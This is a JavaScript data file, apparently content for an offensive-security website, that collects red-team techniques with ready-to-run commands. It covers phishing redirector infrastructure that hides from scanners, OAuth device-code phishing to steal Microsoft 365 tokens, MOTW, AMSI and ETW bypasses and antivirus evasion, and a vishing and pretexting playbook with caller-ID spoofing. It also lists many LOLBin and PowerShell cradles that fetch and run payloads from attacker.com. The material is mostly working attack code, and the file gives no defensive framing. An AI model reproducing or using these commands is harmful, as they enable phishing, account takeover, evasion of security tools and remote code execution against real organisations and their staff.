export const icAdvancedTechniques = [
  {
    id: 'ic-evasive-phishing-infra',
    title: 'Evasive Phishing Infrastructure — Redirectors & Categorisation',
    subtitle: 'Multi-hop phishing infrastructure with traffic filtering, URL warming, and target-keyed delivery',
    tags: ['phishing infra', 'Apache redirect', 'domain categorisation', 'URL warming', 'target keying', 'click tracker', 'geofencing'],
    accentColor: 'cyan',
    overview: 'A naive phishing page hosted directly on a VPS is trivially scanned, blacklisted, and blocked. Production phishing infrastructure uses multi-hop redirectors that serve the phishing page only to targets matching exact criteria — geolocation, corporate IP range, User-Agent, and a valid click token. Automated scanners from security vendors receive a 200 OK with a decoy page or a redirect to microsoft.com, preserving domain reputation.',
    steps: [
      'Register domain 6+ months in advance and categorise it as "Business & Technology" via manual submission to Bluecoat, Cisco Talos, Fortiguard',
      'Warm the domain: set up a legitimate-looking landing page for 30+ days, submit to Google index, get a few backlinks',
      'Redirector layer 1 (front redirector): Apache/NGINX — filter by GeoIP, User-Agent, and referrer; send non-targets to decoy',
      'Redirector layer 2 (GoPhish/Evilginx host): validate the per-target click token embedded in the lure URL',
      'Embed a unique click token per recipient in the lure URL — allows tracking opens and invalidating clicked links',
      'After a target clicks: serve the page; after a bot crawls: serve decoy; after X hours: redirect all to decoy',
    ],
    commands: [
      {
        title: 'Apache multi-layer redirector with GeoIP and UA filtering',
        code: `# Install Apache mod_geoip2 and enable required modules
apt install apache2 libapache2-mod-geoip2 geoip-database
a2enmod rewrite proxy proxy_http geoip headers

# /etc/apache2/sites-available/redirector.conf
<VirtualHost *:443>
    ServerName phish.yourdomain.com
    SSLEngine on
    SSLCertificateFile    /etc/letsencrypt/live/phish.yourdomain.com/fullchain.pem
    SSLCertificateKeyFile /etc/letsencrypt/live/phish.yourdomain.com/privkey.pem

    GeoIPEnable On
    GeoIPDBFile /usr/share/GeoIP/GeoIP.dat

    RewriteEngine On

    # Block non-target countries
    RewriteCond %{ENV:GEOIP_COUNTRY_CODE} !^(GB|US|AU)$
    RewriteRule .* https://microsoft.com? [L,R=302]

    # Require realistic User-Agent (block bots/scanners)
    RewriteCond %{HTTP_USER_AGENT} ^(curl|python|go-http|Scrapy|masscan|zgrab) [NC]
    RewriteRule .* https://microsoft.com? [L,R=302]

    # Require click token in URL (per-recipient unique token)
    RewriteCond %{QUERY_STRING} !token=[a-f0-9]{32}
    RewriteRule .* https://microsoft.com? [L,R=302]

    # Forward validated traffic to GoPhish/Evilginx
    RewriteRule ^(.*)$ http://127.0.0.1:3333$1 [P,L]
    ProxyPassReverse / http://127.0.0.1:3333/
</VirtualHost>`
      },
      {
        title: 'Per-recipient URL token generation and tracking',
        code: `#!/usr/bin/env python3
# generate_lures.py — generate per-target lure URLs with unique tokens

import secrets, csv

BASE_URL = "https://phish.yourdomain.com/secure-login"
TARGETS  = [
    {"name": "Alice Smith",  "email": "alice@victim.com"},
    {"name": "Bob Jones",    "email": "bob@victim.com"},
]

rows = []
for t in TARGETS:
    token = secrets.token_hex(16)   # 32-char hex token
    lure  = f"{BASE_URL}?token={token}&ref=policy-update"
    rows.append({"name": t["name"], "email": t["email"], "token": token, "url": lure})
    print(f"{t['name']}: {lure}")

with open("lure_targets.csv", "w", newline="") as f:
    w = csv.DictWriter(f, fieldnames=rows[0].keys())
    w.writeheader(); w.writerows(rows)

# Token validation in Apache (configured above)
# Token lookup: log each token + IP + timestamp on first use
# After valid click: store token as "used", serve phishing page
# Repeat visits: 404 or decoy to defeat sandboxed re-analysis`
      }
    ]
  },
  {
    id: 'ic-o365-device-code',
    title: 'OAuth Device Code Phishing — Token Theft Without Credentials',
    subtitle: 'Abuse the OAuth device code flow to steal M365 access tokens without ever touching a password',
    tags: ['device code flow', 'OAuth phishing', 'AADInternals', 'TokenTactics', 'M365 token theft', 'MFA bypass', 'refresh token'],
    accentColor: 'cyan',
    overview: 'The OAuth 2.0 Device Authorization Grant (RFC 8628) was designed for input-constrained devices. An attacker initiates a device code flow to get a user_code and verification_uri, then socially engineers the victim to visit the URL and enter the code while the attacker polls for the resulting access + refresh token. The victim sees a legitimate Microsoft page, completes MFA normally, and the attacker receives a long-lived refresh token — no credentials ever sent to a phishing page.',
    steps: [
      'Request a device code from the Microsoft identity platform for a target tenant + scope',
      'Craft a pretext email: "Your IT helpdesk is configuring your new device — please authorise via this Microsoft link"',
      'Include the user_code and verification_uri (login.microsoftonline.com/common/oauth2/deviceauth) in the email body',
      'Victim visits the real Microsoft URL, enters the user_code, and completes MFA normally',
      'Poll the token endpoint until the victim completes auth — receive access_token + refresh_token',
      'Use TokenTactics to refresh to specific M365 scopes: SharePoint, Teams, Exchange, Graph API',
    ],
    commands: [
      {
        title: 'Device code phishing flow',
        code: `# Step 1 — Request device code (attacker side)
curl -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode" \\
  -H "Content-Type: application/x-www-form-urlencoded" \\
  -d "client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&scope=openid+profile+offline_access+https://graph.microsoft.com/.default"

# Response:
# {
#   "device_code": "LONG_DEVICE_CODE",
#   "user_code": "ABCD-EFGH",
#   "verification_uri": "https://microsoft.com/devicelogin",
#   "expires_in": 900,
#   "interval": 5
# }

# Step 2 — Send to victim (phishing email body):
# "Please go to https://microsoft.com/devicelogin and enter code: ABCD-EFGH
#  to authorise your new corporate device"

# Step 3 — Poll for token (attacker side)
while true; do
  RESP=$(curl -s -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \\
    -H "Content-Type: application/x-www-form-urlencoded" \\
    -d "grant_type=urn:ietf:params:oauth:grant-type:device_code&client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&device_code=LONG_DEVICE_CODE")
  echo "$RESP" | grep -q "access_token" && echo "$RESP" && break
  sleep 5
done`
      },
      {
        title: 'Post-capture token refresh with TokenTactics',
        code: `# TokenTactics — refresh to specific M365 scopes
git clone https://github.com/rvrsh3ll/TokenTactics
Import-Module ./TokenTactics.ps1

# Refresh captured token to different services
RefreshTo-MSGraphToken -Domain victim.com -RefreshToken "CAPTURED_REFRESH_TOKEN"
RefreshTo-SharePointToken -Domain victim.com -RefreshToken "CAPTURED_REFRESH_TOKEN"
RefreshTo-OutlookToken -Domain victim.com -RefreshToken "CAPTURED_REFRESH_TOKEN"

# AADInternals — enumerate M365 with stolen token
Install-Module AADInternals
Import-Module AADInternals

# Use access token
Get-AADIntMyAccessTokens -AccessToken "ACCESS_TOKEN"

# Read emails
Read-AADIntUserMail -AccessToken "GRAPH_ACCESS_TOKEN"

# Enumerate Azure AD
Get-AADIntTenantDetails -AccessToken "GRAPH_ACCESS_TOKEN"
Get-AADIntUsers -AccessToken "GRAPH_ACCESS_TOKEN" | Select DisplayName,UserPrincipalName`
      }
    ]
  },
  {
    id: 'ic-payload-smuggling-evasion',
    title: 'Advanced Payload Evasion — MOTW Bypass, AMSI Bypass & Defender Evasion',
    subtitle: 'Bypass Mark-of-the-Web, AMSI, and Windows Defender at delivery and execution time',
    tags: ['MOTW bypass', 'ISO delivery', 'AMSI bypass', 'Defender evasion', 'ThreatCheck', 'string obfuscation', 'signature splitting'],
    accentColor: 'orange',
    overview: 'Delivered payloads must survive three inspection layers: email gateway (static scan), Windows SmartScreen/MOTW (reputation-based), and AMSI/AV (runtime scan). MOTW bypass delivers the payload inside a container format (ISO, VHD) that does not propagate the Zone.Identifier stream to extracted contents. AMSI bypass patches the amsiInitFailed flag in the PowerShell process before any script execution. ThreatCheck identifies the exact bytes triggering AV signatures, allowing surgical obfuscation.',
    steps: [
      'MOTW: deliver LNK/EXE inside an ISO or VHD — files extracted from these containers do not inherit Zone.Identifier ADS on pre-KB5027231 systems',
      'Test payload against Defender offline: copy to VM, run ThreatCheck to pinpoint triggering bytes',
      'Signature split: insert junk bytes or encode the triggering region — ThreatCheck confirms the fix',
      'AMSI bypass: patch amsiInitFailed via reflection before importing or running any .NET tool',
      'ETW bypass: NtTraceControl patch or EtwEventWrite RET patch before executing tools that generate ETW events',
      'Combine: ISO delivery (MOTW) + AMSI bypass in stager + encoded payload → three layers of evasion',
    ],
    commands: [
      {
        title: 'MOTW bypass — ISO and VHD delivery',
        code: `# Create ISO containing payload (no MOTW on extraction)
mkdir payload_staging
cp beacon.exe payload_staging/
mkisofs -o delivery.iso -J -R payload_staging/
# Or use ImgBurn / powerISO on Windows

# VHD delivery (even harder to inspect by gateways)
# PowerShell — create VHD containing payload
$vhd = New-VHD -Path "C:\\temp\\update.vhd" -SizeBytes 50MB -Dynamic
Mount-VHD -Path "C:\\temp\\update.vhd" -Passthru | Initialize-Disk -PartitionStyle MBR -Passthru |
  New-Partition -UseMaximumSize -AssignDriveLetter | Format-Volume -FileSystem FAT32
# Copy payload to mounted VHD drive letter
Copy-Item beacon.exe D:\\
Dismount-VHD -Path "C:\\temp\\update.vhd"

# User opens ISO/VHD → mounts → sees files → NO Zone.Identifier ADS
# Confirm: Get-Item beacon.exe | Get-Content -Stream Zone.Identifier → file not found`
      },
      {
        title: 'ThreatCheck — identify AV-triggering bytes',
        code: `# ThreatCheck — binary search to find exact triggering bytes
ThreatCheck.exe -f beacon.exe -e Defender
ThreatCheck.exe -f beacon.exe -e AMSI

# Output: identifies the specific byte range causing detection
# Fix: XOR-encode that region, insert junk bytes, or re-generate from CS

# AMSI bypass — patch via reflection (PowerShell)
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)
# Run BEFORE any Import-Module or invoke of security tools

# AMSI bypass — alternative (patch via COM)
[Runtime.InteropServices.Marshal]::WriteInt32(
    [Runtime.InteropServices.Marshal]::ReadIntPtr(
        [Runtime.InteropServices.Marshal]::ReadIntPtr(
            [System.IntPtr][System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()
            .Replace("clr.dll","amsi.dll") -as [System.IntPtr]
        )
    ), 0x74636166
)

# ETW bypass — NtTraceControl patch (C)
// HMODULE ntdll = GetModuleHandleA("ntdll.dll");
// FARPROC fn = GetProcAddress(ntdll, "EtwEventWrite");
// DWORD old; VirtualProtect(fn, 1, PAGE_EXECUTE_READWRITE, &old);
// *(BYTE*)fn = 0xC3; // RET
// VirtualProtect(fn, 1, old, &old);`
      }
    ]
  },
  {
    id: 'ic-adversary-sim-pretexting',
    title: 'Adversary Simulation — Pretexting, Vishing & Pretexted Spear Phishing',
    subtitle: 'High-fidelity social engineering that mirrors real-world threat actor TTPs',
    tags: ['pretexting', 'spear phishing', 'vishing', 'OSINT targeting', 'LinkedIn recon', 'email pretext', 'voice phishing', 'social engineering'],
    accentColor: 'cyan',
    overview: 'Technical payloads succeed or fail based on whether the victim clicks. Advanced social engineering builds a convincing pretext from OSINT — the victim\'s name, role, recent activities, org structure — and matches the communication channel (email, Teams, phone) that the target uses. Spear phishing with a personalised pretext achieves 3-5x higher click rates than generic campaigns. Vishing (voice phishing) is the most underused and highest-converting initial access vector.',
    steps: [
      'OSINT phase: LinkedIn, Twitter, company website, job postings — extract names, roles, tech stack, vendors, recent events',
      'Build an org chart from LinkedIn: identify IT helpdesk, HR, finance roles who are highest-value click targets',
      'Pretext design: match a real recent event (merger, system upgrade, mandatory training, invoice processing)',
      'Email pretext: use a lookalike sender domain, match internal email formatting, reference real manager names',
      'Teams/Slack pretext: if external messaging is enabled, send directly from a plausible account',
      'Vishing: call the target from a spoofed caller ID, reference OSINT to build rapport, use urgency/authority',
    ],
    commands: [
      {
        title: 'OSINT target reconnaissance',
        code: `# LinkedIn OSINT — extract org structure and targets
# Tools: LinkedIn OSINT manually or via Sales Navigator trial

# theHarvester — email and employee enumeration
theHarvester -d victim.com -b linkedin,google,bing

# Hunter.io — find email format and addresses
# https://hunter.io/search/victim.com
# Returns email format: {first}.{last}@victim.com

# OSINT Framework — structured recon checklist
# https://osintframework.com/

# Identify:
# - IT helpdesk staff (most likely to be targeted for vishing)
# - Finance / AP staff (invoice pretexts work best)
# - Executives and EAs (whaling / BEC)
# - New employees (less likely to recognise anomalies)

# Recent events for pretext:
# - Job postings: what tech are they deploying?
# - News articles: mergers, acquisitions, new executives
# - LinkedIn activity: who just changed roles?

# Build spear phishing context:
# From: it-helpdesk@<lookalike-domain>.com
# Subject: ACTION REQUIRED: Mandatory Multi-Factor Authentication Enrolment
# Body: Dear <REAL_FIRST_NAME>, as part of our IT security programme
#   following the acquisition of <REAL_COMPANY>, all accounts must enrol...`
      },
      {
        title: 'Vishing script and caller ID spoofing',
        code: `# Vishing flow — IT helpdesk impersonation
# Tools: SpoofCard, Twilio (programmable caller ID), VoIP.ms

# Caller ID spoofing (Twilio)
from twilio.rest import Client
client = Client("TWILIO_SID", "TWILIO_TOKEN")
call = client.calls.create(
    to="+1TARGETPHONE",
    from_="+1CORPORATE_MAINLINE",    # Spoofed corporate number
    url="http://yourserver.com/twiml/vishing_script.xml"
)

# TwiML script (read to caller)
# <Response><Say>This is the IT Service Desk calling about a security alert
# on your account. We need to verify your identity and walk you through
# resetting your MFA device. Can you confirm your username?</Say></Response>

# Vishing flow:
# 1. "Hi, this is <REAL_HELPDESK_PERSON_FROM_LINKEDIN> from IT"
# 2. Reference the real ticket system: "I'm looking at ticket #<RANDOM>"
# 3. Urgency: "Your account is showing unauthorised logins from Eastern Europe"
# 4. Ask target to visit a URL: "Please go to portal.corp.com/verify..." (phishing link)
# 5. Or: ask for current OTP code under guise of "verifying the token works"

# GoPhish — send personalised spear phish
# Template: embed first name, manager name, company name via {{.FirstName}} etc.
# CSV: target.csv with Email,FirstName,LastName,ManagerName,Company columns`
      }
    ]
  },
  {
    id: 'ic-living-off-the-land-delivery',
    title: 'Living-off-the-Land Delivery — LOLBins & Trusted Processes',
    subtitle: 'Use built-in Windows binaries to download, decode, and execute payloads without touching disk',
    tags: ['LOLBins', 'certutil', 'mshta', 'regsvr32', 'wmic', 'bitsadmin', 'msiexec', 'rundll32', 'fileless', 'LOLBAS'],
    accentColor: 'orange',
    overview: 'Living-off-the-Land (LOtL) techniques use legitimate Windows binaries (LOLBins) for payload delivery and execution. These binaries are signed by Microsoft, present on every Windows system, and whitelisted in most application control policies. The downside: they are heavily monitored by EDRs. The key is combining LOLBins with fileless execution — the payload never touches disk as a recognisable file.',
    steps: [
      'certutil -decode: decode a base64-encoded payload — commonly detected but works against outdated AV',
      'mshta: execute an HTA file from a URL — runs JScript/VBScript in a trusted Microsoft process',
      'regsvr32 /s /u /i:<URL> scrobj.dll: execute remote COM scriptlets — "Squiblydoo" technique',
      'wmic process call create: execute arbitrary commands via WMI — useful for lateral movement',
      'msiexec /quiet /i <URL>: install an MSI from a URL — MSI can contain custom actions with shellcode',
      'Combine: regsvr32 /s /n /u /i:https://attacker.com/payload.sct scrobj.dll — no files on disk, signed binary',
    ],
    commands: [
      {
        title: 'LOLBin payload execution techniques',
        code: `# mshta — execute remote HTA (JScript)
mshta https://attacker.com/payload.hta
mshta "javascript:a=new ActiveXObject('WScript.Shell');a.Run('powershell -ep bypass -nop -c IEX((New-Object Net.WebClient).DownloadString(''https://attacker.com/s.ps1''))');close();"

# regsvr32 — Squiblydoo (remote COM scriptlet, no admin, no .reg, AppLocker bypass)
regsvr32.exe /s /n /u /i:https://attacker.com/payload.sct scrobj.dll

# payload.sct (COM scriptlet):
# <?XML version="1.0"?><scriptlet><registration progid="P" classid="{GUID}">
# <script language="JScript">var sh=new ActiveXObject('WScript.Shell');
# sh.Run('powershell -c IEX(...)',0,false);</script></registration></scriptlet>

# msiexec — install MSI from URL (custom action executes shellcode)
msiexec /quiet /i https://attacker.com/update.msi

# bitsadmin — download and execute
bitsadmin /transfer update /download /priority high https://attacker.com/beacon.exe %TEMP%\\update.exe
start /b %TEMP%\\update.exe

# wmic — remote process creation (lateral movement)
wmic /node:TARGET.corp.local /user:CORP\\admin /password:Password123! \\
  process call create "cmd.exe /c certutil -urlcache -f https://attacker.com/beacon.exe %TEMP%\\s.exe && %TEMP%\\s.exe"

# certutil — base64 decode
certutil -decode encoded_payload.b64 payload.exe
certutil -urlcache -split -f https://attacker.com/beacon.exe %TEMP%\\update.exe`
      },
      {
        title: 'Fileless PowerShell download cradles',
        code: `# Standard download cradle (most monitored)
IEX (New-Object Net.WebClient).DownloadString('https://attacker.com/s.ps1')

# Via Invoke-Expression alias bypass
&(GCM I*x) (irm https://attacker.com/s.ps1)

# Encoded cradle (base64 command line)
$c = 'IEX (New-Object Net.WebClient).DownloadString(''https://attacker.com/s.ps1'')'
powershell -enc ([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($c)))

# WebRequest method variation
$r = [System.Net.HttpWebRequest]::Create('https://attacker.com/s.ps1')
IEX ([System.IO.StreamReader]::new($r.GetResponse().GetResponseStream()).ReadToEnd())

# COM-based (no Net.WebClient in commandline)
$h = New-Object -ComObject WinHttp.WinHttpRequest.5.1
$h.Open('GET','https://attacker.com/s.ps1',$false); $h.Send()
IEX $h.ResponseText

# Constrained Language Mode bypass — use COM objects
$shell = [activator]::CreateInstance([type]::GetTypeFromProgID('WScript.Shell'))
$shell.Run('cmd /c powershell -ep bypass -c "IEX((iwr https://attacker.com/s.ps1).Content)"',0,$true)`
      }
    ]
  },
];